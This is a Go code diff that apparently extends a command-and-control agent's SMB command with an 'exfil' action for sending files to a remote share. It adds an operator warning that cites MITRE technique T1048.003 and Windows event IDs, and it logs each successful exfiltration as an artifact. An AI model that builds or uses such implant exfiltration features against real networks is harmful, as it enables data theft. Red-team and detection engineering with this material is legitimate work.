@@ -39,9 +39,9 @@ func init() {
 				Name:             "action",
 				CLIName:          "action",
 				ModalDisplayName: "Action",
-				Description:      "Operation: shares, ls, cat, upload, rm, mkdir, mv, push (lateral tool transfer), share-sweep (automated shares → share-hunt → triage chain)",
+				Description:      "Operation: shares, ls, cat, upload, rm, mkdir, mv, push (lateral tool transfer), exfil (data exfiltration to SMB share), share-sweep (automated chain)",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"shares", "ls", "cat", "upload", "rm", "mkdir", "mv", "push", "share-sweep"},
+				Choices:          []string{"shares", "ls", "cat", "upload", "rm", "mkdir", "mv", "push", "exfil", "share-sweep"},
 				DefaultValue:     "shares",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default"},
@@ -196,6 +196,12 @@ func init() {
 					source, _ := taskData.Args.GetStringArg("source")
 					msg += fmt.Sprintf(" Pushing local file '%s' to remote share — file write to remote system is a lateral tool transfer indicator (T1570).", source)
 				}
+				if action == "exfil" {
+					source, _ := taskData.Args.GetStringArg("source")
+					msg += fmt.Sprintf(" CRITICAL: Data exfiltration of '%s' to remote SMB share (T1048.003). "+
+						"File write to remote share generates SMB traffic and file creation events. "+
+						"DLP solutions may inspect SMB file transfers for sensitive content.", source)
+				}
 				msg += " SMB connections generate Event ID 5140/5145 (share access) and 4624 (network logon)."
 			}
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
@@ -215,9 +221,23 @@ func init() {
 			if !ok || responseText == "" {
 				return response
 			}
+			// Track SMB exfil operations
+			var exfilResult struct {
+				Host       string `json:"host"`
+				Share      string `json:"share"`
+				RemotePath string `json:"remote_path"`
+				FileName   string `json:"filename"`
+				TotalSize  int    `json:"total_size"`
+				Success    bool   `json:"success"`
+			}
+			if err := json.Unmarshal([]byte(responseText), &exfilResult); err == nil && exfilResult.Host != "" && exfilResult.Success {
+				createArtifact(processResponse.TaskData.Task.ID, "Exfiltration",
+					fmt.Sprintf("SMB exfil: %s (%d bytes) → \\\\%s\\%s\\%s",
+						exfilResult.FileName, exfilResult.TotalSize,
+						exfilResult.Host, exfilResult.Share, exfilResult.RemotePath))
+			}
 			// Track SMB operations: look for host reference in output
 			if strings.Contains(responseText, "Shares on") || strings.Contains(responseText, "SMB") {
-				// Extract host from "Shares on \\host" or similar
 				for _, line := range strings.Split(responseText, "\n") {
 					if strings.Contains(line, "Shares on") {
 						createArtifact(processResponse.TaskData.Task.ID, "Network Connection",
